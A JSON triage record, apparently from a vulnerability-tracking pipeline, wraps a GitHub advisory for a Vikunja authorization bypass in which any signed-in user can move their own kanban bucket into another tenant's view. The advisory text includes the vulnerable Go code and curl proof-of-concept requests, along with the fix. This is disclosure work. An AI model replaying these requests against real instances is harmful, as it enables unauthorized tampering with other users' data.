@@ -1,0 +1,58 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/37031448?v=4\", \"events_url\": \"https://api.github.com/users/voraci0us/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/voraci0us/followers\", \"following_url\": \"https://api.github.com/users/voraci0us/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/voraci0us/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/voraci0us\", \"id\": 37031448, \"login\": \"voraci0us\", \"node_id\": \"MDQ6VXNlcjM3MDMxNDQ4\", \"organizations_url\": \"https://api.github.com/users/voraci0us/orgs\", \"received_events_url\": \"https://api.github.com/users/voraci0us/received_events\", \"repos_url\": \"https://api.github.com/users/voraci0us/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/voraci0us/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/voraci0us/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/voraci0us\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-55067\", \"cvss\": {\"score\": 5.0, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:L/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 5.0, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:L/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-639\", \"name\": \"Authorization Bypass Through User-Controlled Key\"}], \"description\": \"## Summary\\n\\n`POST /api/v1/projects/{project}/views/{view}/buckets/{bucket}` mass-assigns the request body's `project_view_id` onto the bucket row. The permission check only verifies that the URL-supplied bucket already belongs to the URL-supplied `(project, view)` pair; the body's `project_view_id` is never validated. Any signed-in user can therefore take one of their own buckets and graft it into any other tenant's kanban view, with attacker-controlled title and the attacker's account as `created_by`.\\n\\nThis vulnerability was found using an LLM, and manually verified against latest (2.3.0).\\n\\n## Vulnerable code\\n\\n`pkg/models/kanban.go` (lines 348-359):\\n\\n```go\\nfunc (b *Bucket) Update(s *xorm.Session, _ web.Auth) (err error) {\\n    _, err = s.\\n        Where(\\\"id = ?\\\", b.ID).\\n        Cols(\\n            \\\"title\\\",\\n            \\\"limit\\\",\\n            \\\"position\\\",\\n            \\\"project_view_id\\\",   // mass-assigned from the request body\\n        ).\\n        Update(b)\\n    return\\n}\\n```\\n\\n`Bucket.CanUpdate` (`canDoBucket`) only validates that the URL-supplied `{bucket}` belongs to the URL-supplied `{project}/{view}`. The body's `project_view_id` reaches `Update` unchecked and is written through.\\n\\n## Proof of Concept\\n\\n**Prerequisites:** Two registered users (`attacker` and `victim`). In the IDs below: attacker's project is `2`, kanban view `8`; victim's project is `1`, kanban view `4`.\\n\\n**Step 1:** Attacker creates a fresh bucket in their own project.\\n\\n```bash\\ncurl -s -X PUT 'http://localhost:13456/api/v1/projects/2/views/8/buckets' \\\\\\n  -H 'Authorization: Bearer <attacker_token>' \\\\\\n  -H 'Content-Type: application/json' \\\\\\n  -d '{\\\"title\\\":\\\"PWNED BUCKET\\\"}' | jq '.id'\\n# Returns: 7\\n```\\n\\n**Step 2:** Attacker updates bucket `7`, supplying `project_view_id` = victim's view ID. The URL chain is the attacker's, so `CanUpdate` passes; the body field is written through without further checks.\\n\\n```bash\\ncurl -s -X POST 'http://localhost:13456/api/v1/projects/2/views/8/buckets/7' \\\\\\n  -H 'Authorization: Bearer <attacker_token>' \\\\\\n  -H 'Content-Type: application/json' \\\\\\n  -d '{\\\"title\\\":\\\"PWNED BUCKET\\\",\\\"limit\\\":0,\\\"project_view_id\\\":4}' | jq '{id,title,project_view_id}'\\n# Returns: {\\n#   \\\"id\\\": 7,\\n#   \\\"title\\\": \\\"PWNED BUCKET\\\",\\n#   \\\"project_view_id\\\": 4\\n# }\\n```\\n\\n**Step 3:** Victim lists buckets in their own view; the attacker's bucket is now there, owned by the attacker.\\n\\n```bash\\ncurl -s 'http://localhost:13456/api/v1/projects/1/views/4/buckets' \\\\\\n  -H 'Authorization: Bearer <victim_token>' | jq '[.[]|{id,title,created_by:.created_by.username}]'\\n# Returns: [\\n#   {\\\"id\\\":7,\\\"title\\\":\\\"PWNED BUCKET\\\",\\\"created_by\\\":\\\"attacker\\\"},\\n#   {\\\"id\\\":1,\\\"title\\\":\\\"To-Do\\\",\\\"created_by\\\":\\\"victim\\\"},\\n#   {\\\"id\\\":2,\\\"title\\\":\\\"Doing\\\",\\\"created_by\\\":\\\"victim\\\"},\\n#   {\\\"id\\\":3,\\\"title\\\":\\\"Done\\\",\\\"created_by\\\":\\\"victim\\\"}\\n# ]\\n```\\n\\nAfter relocation the attacker can no longer reach the row (it lives in the victim's view), so only the victim can delete the graffiti. `project_view_id` is a sequential integer, so any tenant's view can be targeted by enumeration.\\n\\n## Impact\\n\\nAny signed-in user can inject arbitrary-titled buckets into any other tenant's kanban view. Most likely exploitation here would be graffiti/defacement.\\n\\n## Fix\\n\\nIn `(b *Bucket) Update`, drop `project_view_id` from the `Cols(...)` allowlist (mass-assignment fix) and reject body payloads where `project_view_id != bucket.ProjectViewID`. If legitimate \\\"move bucket between views\\\" is a needed feature, expose it as a dedicated endpoint that calls `CanUpdate` against both the source and destination view.\", \"ghsa_id\": \"GHSA-569v-q83c-3j3g\", \"github_reviewed_at\": \"2026-08-28T16:55:16Z\", \"html_url\": \"https://github.com/advisories/GHSA-569v-q83c-3j3g\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-569v-q83c-3j3g\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-55067\"}], \"nvd_published_at\": null, \"published_at\": \"2026-08-28T16:55:16Z\", \"references\": [\"https://github.com/go-vikunja/vikunja/security/advisories/GHSA-569v-q83c-3j3g\", \"https://github.com/go-vikunja/vikunja/pull/3239\", \"https://github.com/go-vikunja/vikunja/commit/b31d606b8879ebe98fbb2ac5d8b3066b86f59868\", \"https://github.com/go-vikunja/vikunja/releases/tag/v2.4.0\", \"https://github.com/advisories/GHSA-569v-q83c-3j3g\"], \"repository_advisory_url\": \"https://api.github.com/repos/go-vikunja/vikunja/security-advisories/GHSA-569v-q83c-3j3g\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/go-vikunja/vikunja\", \"summary\": \"Vikunja vulnerable to authenticated cross-tenant kanban-bucket relocation via `project_view_id` mass-assignment\", \"type\": \"reviewed\", \"updated_at\": \"2026-08-28T16:55:17Z\", \"url\": \"https://api.github.com/advisories/GHSA-569v-q83c-3j3g\", \"vulnerabilities\": [{\"first_patched_version\": \"2.4.0\", \"package\": {\"ecosystem\": \"go\", \"name\": \"code.vikunja.io/api\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 2.3.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-569v-q83c-3j3g",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "code.vikunja.io/api: <= 2.3.0"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-55067"
+    ],
+    "cvss_score": 5.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:L/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "code.vikunja.io/api"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-08-28T21:56:46.639271Z",
+  "provenance": {
+    "content_sha256": "b7abdd8c6b0e32c63db3407e94ad1987ceeaa0dd795a8c3930208534f71ed06e",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-08-28T16:55:16Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-569v-q83c-3j3g",
+  "status": "active",
+  "title": "Vikunja vulnerable to authenticated cross-tenant kanban-bucket relocation via `project_view_id` mass-assignment",
+  "updated_at": "2026-08-28T16:55:17Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-569v-q83c-3j3g"
+}
